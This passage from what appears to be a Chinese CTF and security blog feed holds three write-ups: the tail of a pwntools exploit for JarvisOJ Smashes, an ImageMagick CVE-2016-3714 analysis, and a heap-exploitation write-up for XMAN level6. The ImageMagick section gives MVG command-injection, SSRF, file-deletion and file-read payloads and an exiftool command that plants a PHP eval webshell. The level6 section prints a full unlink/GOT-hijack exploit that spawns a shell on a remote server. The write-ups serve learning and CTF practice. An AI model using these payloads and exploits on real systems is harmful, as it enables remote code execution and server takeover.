class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>运行结果图：</p><p><img src="/img/Smashes/Smashes15.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ImageMagick命令执行漏洞（CVE-2016-3714）浅析</title>
      <link href="/2020/08/04/ImageMagick/"/>
      <url>/2020/08/04/ImageMagick/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做CTF题的时候碰到一道图片上传漏洞的题，尝试了很久发现并不能绕过检测。经过大佬提示这道题玩的是ImageMagick命令执行漏洞，CVE编号CVE-2016-3714，所以就想去好好了解一下这个漏洞。</p><span id="more"></span><h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><p>ImageMagick是一款功能强大，用户极多的开源图片处理软件，，可以用来读、写和处理多种格式的图片文件。很多网站开发者会调用这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等操作。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>ImageMagick是一款开源图片处理库，支持PHP、Ruby、NodeJS和Python等多种语言，使用非常广泛。包括PHP imagick、Ruby rmagick和paperclip以及NodeJS imagemagick等多个图片处理插件都依赖它运行。当攻击者构造含有恶意代码得图片时，ImageMagick库对于HTTPPS文件处理不当，没有做任何过滤，可远程实现远程命令执行，进而可能控制服务器。</p><p>相同问题触发的漏洞有很多，如CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714命令执行漏洞。</p><p>该漏洞影响范围为ImageMagick 6.9.3-9以前的所有版本。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>ImageMagick之所以支持那么多的文件格式,是因为它内置了非常多的图像处理库,对于这些图像处理库,ImageMagick给它起了个名字叫做”Delegate”(委托),每个Delegate对应一种格式的文件,然后通过系统的system()命令来调用外部的lib进行处理。调用外部lib的过程是使用系统的system命令来执行的，导致命令执行的代码。</p><p>在ImageMagick的默认配置文件里可以看到所有的委托：&#x2F;etc&#x2F;ImageMagick&#x2F;delegates.xml</p><p>具体代码参考<a href="https://github.com/ImageMagick/ImageMagick/blob/25d021ff1a60a67680dbb640ccc0b6b60f785192/magick/delegate.c">这里</a></p><p>该漏洞出现在mageMagick对https形式的文件处理的过程中，所以直接定位到https Delegate那里：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; <span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">\</span>&quot;<span class="attr">https</span>\&quot; <span class="attr">command</span>=<span class="string">\</span>&quot;&amp;<span class="attr">quot</span>;<span class="attr">wget</span>&amp;<span class="attr">quot</span>; <span class="attr">-q</span> <span class="attr">-O</span> &amp;<span class="attr">quot</span>;%<span class="attr">o</span>&amp;<span class="attr">quot</span>; &amp;<span class="attr">quot</span>;<span class="attr">https:</span>%<span class="attr">M</span>&amp;<span class="attr">quot</span>;\&quot;/&gt;</span>&quot;</span><br></pre></td></tr></table></figure><p>可以看到，command定义了它对于https文件处理时带入system()函数得命令：<code>&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;</code>。有些版本可能使用的curl命令，问题还是一样的。</p><p>wget是从网络下载文件得命令，%M是一个占位符，被定义为输入的图片格式,也就是我们输入的url地址。但是由于只是做了简单的字符串拼接,没有做任何过滤，直接拼接到command命令中，所以我们可以将引号闭合后通过”|”,”&#96;”,”&amp;”等带入其他命令,也就形成了命令注入。</p><p>比如我们传入如下代码：<code>https://test.com&quot;|ls “-al</code></p><p>则实际得system函数执行得命令为：<code>“wget” -q -O “%o” “ https://test.com&quot;|ls “-al”</code></p><p>这样，ls -al命令成功执行。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，允许在其中加载ImageMagick中其他的delegate(比如存在漏洞的https delegate)。并且在图形处理的过程中,ImageMagick会自动根据其内容进行处理,也就是说我们可以将文件随意定义为png、jpg等网站上传允许的格式,这大大增加了漏洞的可利用场景。</p><p>所以我们可以构造一个.mvg格式的图片（但文件名可以不为.mvg，比如下图中包含payload的文件的文件名为vul.gif，而ImageMagick会根据其内容识别为mvg图片），并在https:&#x2F;&#x2F;后面闭合双引号，写入自己要执行的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* push graphic-context</span><br><span class="line">* viewbox 0 0 640 480</span><br><span class="line">* fill &#x27;url(https://&quot;|id; &quot;)&#x27;</span><br><span class="line">* pop graphic-context</span><br></pre></td></tr></table></figure><p>简单解释一下上面的POC：</p><ul><li><p>push和pop是用于堆栈的操作，一个进栈，一个出栈;</p></li><li><p>viewbox是表示SVG可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面;</p></li><li><p>fill url()是把图片填充到当前元素内;</p></li></ul><p>使用fill url()的形式调用存在漏洞的https delegate，当ImageMagick去处理这个文件时,漏洞就会被触发。</p><h2 id="系列漏洞"><a href="#系列漏洞" class="headerlink" title="系列漏洞"></a>系列漏洞</h2><p>CVE-2016-3718：利用mvg格式中可以包含url的特点，进行SSRF攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* push graphic-context</span><br><span class="line">* viewbox 0 0 640 480</span><br><span class="line">* fill &#x27;url(http://example.com/)&#x27;</span><br><span class="line">* pop graphic-context</span><br></pre></td></tr></table></figure><p>CVE-2016-3715：利用ImageMagick支持的ephemeral协议，来删除任意文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* push graphic-context</span><br><span class="line">* viewbox 0 0 640 480</span><br><span class="line">* image over 0,0 0,0 &#x27;ephemeral:/tmp/delete.txt&#x27;</span><br><span class="line">* popgraphic-context</span><br></pre></td></tr></table></figure><p>CVE-2016-3716：利用ImageMagick支持的msl协议（读取一个msl格式的xml文件，并根据其内容执行一些操作），来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">* file_move.mvg</span><br><span class="line">* -=-=-=-=-=-=-=-=-</span><br><span class="line">* push graphic-context</span><br><span class="line">* viewbox 0 0 640 480</span><br><span class="line">* image over 0,0 0,0 &#x27;msl:/tmp/msl.txt&#x27;</span><br><span class="line">* popgraphic-context</span><br><span class="line">* </span><br><span class="line">* /tmp/msl.txt</span><br><span class="line">* -=-=-=-=-=-=-=-=-</span><br><span class="line">* &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">* &lt;image&gt;</span><br><span class="line">* &lt;read filename=&quot;/tmp/image.gif&quot; /&gt;</span><br><span class="line">* &lt;write filename=&quot;/var/www/shell.php&quot; /&gt;</span><br><span class="line">* &lt;/image&gt;</span><br></pre></td></tr></table></figure><p>CVE-2016-3717：本地文件读取漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* push graphic-context</span><br><span class="line">* viewbox 0 0 640 480</span><br><span class="line">* image over 0,0 0,0 &#x27;label:@/etc/hosts&#x27;</span><br><span class="line">* pop graphic-context</span><br></pre></td></tr></table></figure><h2 id="漏洞扩展"><a href="#漏洞扩展" class="headerlink" title="漏洞扩展"></a>漏洞扩展</h2><p>PHP扩展『ImageMagick』也存在这个问题，而且只需要调用了Imagick类的构造方法，即可触发这个漏洞。</p><p>除了.mvg格式的图片以外，普通png格式的图片也能触发命令执行漏洞。在ImageMagick源码中除了%m，还有%l占位符，表示图片exif label信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">&quot;miff&quot;</span> <span class="attr">encode</span>=<span class="string">&quot;show&quot;</span> <span class="attr">spawn</span>=<span class="string">&quot;True&quot;</span> <span class="attr">command</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span>/usr/bin/display<span class="symbol">&amp;quot;</span> -delay 0 -window-group %[group] -title <span class="symbol">&amp;quot;</span>%l <span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>ephemeral:%i<span class="symbol">&amp;quot;</span>&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>它将%l拼接进入了&#x2F;usr&#x2F;bin&#x2F;display命令中，所以我只需将正常的png图片，带上一个『恶意』的exif信息。在调用ImageMagick将其处理成.show文件的时候，即可触发命令注入漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* exiftool -label=&quot;\&quot;|/usr/bin/id; \&quot;&quot; test.png</span><br><span class="line">* convert test.png o.show</span><br></pre></td></tr></table></figure><p>但这个方法鸡肋之处在于，因为delegate.xml中配置的encode&#x3D;show（或win），所以只有输出为.show或.win格式的情况下才会调用这个委托，而普通的文件处理是不会触发这个命令的。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>最后回到那道CTF题：<a href="http://web.jarvisoj.com:32790/">Jarvis OJ - 图片上传漏洞</a>。</p><p>通过网站目录扫描发现有和test.php界面，打开发现是phpinfo界面，其中开启了imagick模块：</p><p><img src="/img/ImageMagick/ImageMagick1.png"></p><p>先用 exiftool 生成一个一句话后门，路径由 phpinfo 得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -label=<span class="string">&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\$\_POST\[x\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/x.php; \&quot;&quot;</span> normal.png </span><br></pre></td></tr></table></figure><p>然后上传图片：</p><p><img src="/img/ImageMagick/ImageMagick2.png"></p><p>之后就是直接连接webshell或者找flag了：</p><p><img src="/img/ImageMagick/ImageMagick3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnerabilities </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMAN level6 の Write-Up</title>
      <link href="/2020/07/29/XMAN-level6/"/>
      <url>/2020/07/29/XMAN-level6/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这是JarvisOJ的PWN题部分[XMAN]level6的Write-Up。是XMAN系列第一道堆溢出的题目，整体难度一般，涉及到的知识点还是蛮多蛮基础的。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>废话不多说直接上手，程序运行图：</p><p><img src="/img/XMAN-level6/XMAN1.png"></p><p>checksec：32位程序，依然只有DEP保护，但这是堆溢出的题目，栈上的保护只有部分有参考意义</p><p><img src="/img/XMAN-level6/XMAN2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>把程序丢到hopper中，看一下主函数：</p><p><img src="/img/XMAN-level6/XMAN3.png"></p><p>首先是我们看到的程序界面：</p><p><img src="/img/XMAN-level6/XMAN4.png"></p><p>然后会对输入的参数进行范围判断，不在范围内的将返回’Invalid!’，在范围内的将跳转到相应的功能函数。下面我们稍稍分析各个功能函数，首先是List Note：</p><p><img src="/img/XMAN-level6/XMAN5.png"></p><p>这个函数就是先判断目前有没有note，没有返回 “You need to create some new notes first.”，有的话就遍历列出所有的note。</p><p>接着是New Note：</p><p><img src="/img/XMAN-level6/XMAN6.png"></p><p>在函数中发现申请的chunk大小是至少是0x80，所以属于smallbin。</p><p>接着是Edit Note：</p><p><img src="/img/XMAN-level6/XMAN7.png"></p><p>在New Note和Edit Note功能中都是通过sub_8048670函数实现读取字符串的：</p><p><img src="/img/XMAN-level6/XMAN8.png"></p><p>但是这个函数只是读取输入的字符串，并没有在输入的字符串后面加上’\x00’，那么这里是一个可以利用的漏洞。</p><p>最后看一下Delete Note：</p><p><img src="/img/XMAN-level6/XMAN9.png"></p><p>可以看出来，这个函数在free之前仅仅检查了Note number的范围是否合法，既没有检查对应的Note到底存在不存在，free之后也没有将note对应的指针清空，所以这里存在典型的Double Free漏洞和Use After Free漏洞。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>在Edit Note函数中是对note对应的指针的存在与否是有检查的，防止我们利用Use After Free漏洞。</p><p>Double Free漏洞可以实现修改任意位置的任意值，所以需要找到能够泄露内存中地址的漏洞，而经过上面的分析，在sub_8048670函数这里是可以实现的。</p><p>下面具体分析下如何利用这个函数配合Use After Free漏洞实现泄露栈中地址。</p><p>首先申请两个note，编号0和1，根据内存机制分配chunk0。这时我们释放编号为0的note，chunk0根据规则首先会进入unsorted bin中。然后再次申请一个note，根据unsorted bin的LIFO策略，分配给我们的是编号为0的note对应的chunk空间。这个chunk的结构此时应该是这样的：</p><p><img src="/img/XMAN-level6/XMAN10.png"></p><p>整个绿色部分都是目前的note的用户数据部分，所以当我们输出这个note的时候其实note0的bk指针就被泄露出来了。</p><p>而note0作为第一块small chunk，fd和bk指针指向的是main_arena的特定位置，再通过计算就可以知道libc的基址。</p><p>具体操作如下：</p><ul><li><p>创建两个note0和1(防止top chunk的合并)。</p></li><li><p>free掉note0。</p></li><li><p>再创建一个新的note，而且申请的chunk的大小要与free掉的一致，这样才能获取原来note0的空间，输入的大小不能超过四个字节，否则会覆盖note0的值。</p></li><li><p>list note获取note0的bk值。</p></li></ul><p>至于如何计算解释如下：</p><p>linux中使用free函数释放堆空间的时候，不大于max_fast的chunk被释放后首先会被放入fastbin中，大于max_fast的chunk或者fastbin中的空闲chunk合并后会被放入unsorted bin中。</p><p>当fastbin为空的时候，unsorted bin中chunk的fd和bk指向自身的main_arena，而main_arena的地址存放在libc中的malloc_trim函数中也即相对于lic基址的offset，这样我们就可以计算出libc的基址。</p><p>在32位程序中main_arena 的位置与 __malloc_hook 相差0x18，同时加入到unsorted bin中的small chunk的fd和bk通常指向 &lt;main_arena+48&gt; 的位置。在64位程序中，main_arena 的位置与 __malloc_hook 相差0x10，同时加入到unsorted bin中的small chunk的fd和bk通常指向 &lt;main_arena+88&gt; 的位置。</p><p>所以32位程序中：offset &#x3D; libc.symbols[‘__malloc_hook’] + 0x18，64位程序同理。</p><p>或者直接到libc文件中找main_arena的地址，如下图所示：</p><p><img src="/img/XMAN-level6/XMAN11.png"></p><p>至于为什么这个是main_arena的地址，可以对比malloc.c源代码看一下：</p><p><img src="/img/XMAN-level6/XMAN12.png"></p><p>泄露heap地址的方法一样，首先需要申请4个note0，1，2，3，然后释放不相邻的note0和note2（防止被合并），这样被释放的两个chunk会在smallbin中形成双向链表。</p><p>这时我们按照泄露libc地址同样的操作泄露chunk0的bk值，此时的bk指向的是chunk2。分配chunk的时候是从距堆底0xc28开始的，这是固定的。</p><p>故而有这样一个等式：heap_addr &#x3D; chunk2_addr(chunk0_bk) - chunk1_size - chunk0_size - 0xc28。</p><p>小结一下，泄露libc基址为了后面劫持got表控制程序执行system函数，泄露heap基址是因为unlink需要指向chunk的指针，而指针保存在堆起始位置。</p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>前期准备工作到此就结束了，下面是需要触发unlink。</p><ul><li>本题没有检查chunk是否释放，可以先连续malloc三个堆,chunkA,chunkB,chunkC，再释放。根据堆的特性，这三个堆会合并。这时再分配一个小于size(chunkA)+size(chunkB)+size(chunkC)+0x20的堆，系统会分配给我们合并的空间。然后再对这片内存操作，伪造连续四个堆。因为考虑到chunk的flag指向的是前一个Chunk的状态，而要触发unlink操作的话，需要检查上一个chunk和下一个chunk的状态，需要查看该chunk的flag和下下个chunk的flag。</li></ul><p>同时在伪造的时候，系统还会做检查，确定指针有没有被改写：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize == P</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize == P</span><br></pre></td></tr></table></figure><p>所以构造的时候存在限制。这里简单复习一下unlink的操作。</p><ul><li><p>分配两个大于80字节的堆块，因为小于80字节可能是fastbin。</p></li><li><p>chunk0用来伪造需要unlink的空闲堆块，其中要设置堆块头以及fd和bk指针。</p></li><li><p>chunk1需要伪造后面的堆块，即设置pre_size和size字段，且将size最后一位即PRE_INUSE设置为0，表示前面的chunk空闲需要合并。</p></li><li><p>free chunk1时，系统检查发现前一块chunk处于空闲状态，于是合并，触发unlink。</p></li><li><p>至于如何让绕过系统的检查，是炫耀了解一下’-&gt;’操作符。该操作符左边是指针，这个指针存放了某个内存地址，右边是左边指针指向地址的某个offset。合起来就是取指针指向某个内存地址的offset处的内存。fd的offset是2个机器位数（32位系统是4字节，64位系统是8字节），bk的offset是3个机器位数。为了绕过系统检查，chunk0伪造的空闲chunk的fd需要设置为&amp;P - 3<em>size(int)，bk需要设置为&amp;P - 2</em>size(int)。至于为什么这么设置可以参考之前介绍unlink的文章，按照unlink的步骤推演一下即可。</p></li><li><p>这样经过unlink操作，P就指向了比自己地址低3个机器位数的位置。通过写入覆盖P本身，将其修改为任意地址。之后就可以通过读或者写功能实现该任意地址的读写。</p></li></ul><p>本题中具体过程如下：</p><p>首先P是指向chunk0的指针，通过覆盖可以构造一个fake chunk，其中fake chunk的fd &#x3D; P - 12，bk &#x3D; P - 8。当覆盖至chunk1时，修改pre_size &#x3D; 0x80，size &#x3D; 0x80，表示前一块chunk未使用。</p><p>Free chunk1的时候，前一块构造的fake chunk处于空闲状态，所以会发生向后合并。libc寻找chunk是通过物理地址后一块的地址减去pre_size得到的，所以P依然是指向chunk0的指针，这时就会指向P - 12的位置。（unlink会进行两次赋值，故而只有第二次的有效）</p><p>接下来就需要再次写入P，覆盖指针为free@got，这个就可以通过修改P-12位置实现。最后再向P写入system函数的地址，那么执行free函数就变成了执行system函数。</p><p>具体怎么覆盖就涉及到本题中具体的数据结构。首先整个结构体如下图所示：</p><p><img src="/img/XMAN-level6/XMAN13.png"></p><p>左边是整体结构，右边是每个Note的结构，所以当我们伪造了fake chunk之后，堆结构是这样的：</p><p><img src="/img/XMAN-level6/XMAN14.png"></p><p>当我们unlink之后，堆又变了样：</p><p><img src="/img/XMAN-level6/XMAN15.png"></p><p>所以在构造payload覆盖P的时候需要注意所覆盖区域原本的意义，否则无法getshell。另外还需要注意填充的时候新构造的chunk要和原来的大小一样，否则会调用realloc导致报错。</p><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>最后给出EXP，其中本地和远程均可调通：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh = process(<span class="string">&#x27;./freenote_x86&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    offset = <span class="number">0x1b27b0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>, <span class="number">9885</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.19.so&#x27;</span>)</span><br><span class="line">    offset = <span class="number">0x1ad450</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./freenote_x86&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">List</span>(): </span><br><span class="line">sh.recvuntil(<span class="string">&quot;Your choice: &quot;</span>) </span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">New</span>(<span class="params">data</span>): </span><br><span class="line">sh.recvuntil(<span class="string">&quot;Your choice: &quot;</span>) </span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>) </span><br><span class="line">sh.recvuntil(<span class="string">&quot;Length of new note: &quot;</span>) </span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(data))) </span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter your note: &quot;</span>) </span><br><span class="line">sh.sendline(data) </span><br><span class="line">sh.recvuntil(<span class="string">&quot;Done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Edit</span>(<span class="params">index,data</span>):</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Length of note: &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line">sh.sendline(data)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">index</span>): </span><br><span class="line">sh.recvuntil(<span class="string">&quot;Your choice: &quot;</span>) </span><br><span class="line">sh.sendline(<span class="string">&quot;4&quot;</span>) </span><br><span class="line">sh.recvuntil(<span class="string">&quot;Note number: &quot;</span>) </span><br><span class="line">sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc address</span></span><br><span class="line">New(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>) <span class="comment"># note0</span></span><br><span class="line">New(<span class="string">&#x27;b&#x27;</span> * <span class="number">0x80</span>) <span class="comment"># note1</span></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">New(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line"><span class="type">List</span>()</span><br><span class="line"></span><br><span class="line">a = sh.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">libc_addr = u32(a[-<span class="number">8</span>:-<span class="number">4</span>]) - offset</span><br><span class="line">sys_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + libc_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap address</span></span><br><span class="line">New(<span class="string">&#x27;c&#x27;</span> * <span class="number">0x80</span>) <span class="comment"># note2</span></span><br><span class="line">New(<span class="string">&#x27;d&#x27;</span> * <span class="number">0x80</span>) <span class="comment"># note3</span></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">New(<span class="string">&#x27;BBB&#x27;</span>)</span><br><span class="line"><span class="type">List</span>()</span><br><span class="line"></span><br><span class="line">b = sh.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">chunk2_addr = u32(b[-<span class="number">8</span>:-<span class="number">4</span>])</span><br><span class="line">heap_addr = chunk2_addr - <span class="number">0xc28</span> - <span class="number">0x80</span> - <span class="number">0x80</span></span><br><span class="line">chunk0_addr = heap_addr + <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># fake chunk : pre_size - size - fd - bk</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x81</span>) + p32(chunk0_addr - <span class="number">12</span>) + p32(chunk0_addr - <span class="number">8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">&#x27;C&#x27;</span>) <span class="comment"># chunk0</span></span><br><span class="line">payload += p32(<span class="number">0x80</span>) + p32(<span class="number">0x80</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span> * <span class="number">2</span>, <span class="string">&#x27;C&#x27;</span>) <span class="comment"># chunk1</span></span><br><span class="line"></span><br><span class="line">New(payload)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack got</span></span><br><span class="line">payload2 = p32(<span class="number">3</span>) + p32(<span class="number">1</span>) + p32(<span class="number">4</span>) + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(<span class="number">1</span>) + p32(<span class="number">8</span>) + p32(heap_addr + <span class="number">0xc28</span> + <span class="number">0x80</span>)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x80</span> * <span class="number">2</span>, <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, payload2)</span><br><span class="line">Edit(<span class="number">0</span>, p32(sys_addr))</span><br><span class="line">Edit(<span class="number">1</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行结果截图：</p><p><img src="/img/XMAN-level6/XMAN16.png"></p><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><p>这道题对于堆初学者来说帮助很大，能够加深堆堆溢出利用的了解。本题还有其他的方法，综合下来可以学到UAF，Double Free，GOT表劫持，unsorted bin泄露地址，unlink利用等等知识，值得花很多时间去细细品味。</p><p>反正这道题花了我一周时间&#x3D;&#x3D;，主要还是网上很多大佬写的Write Up太简单了（也可能是我太菜）而且它们的重心都放在了解释伪造chunk触发unlink上了，对于其他的细节没能做解释。所以当直接去看Write 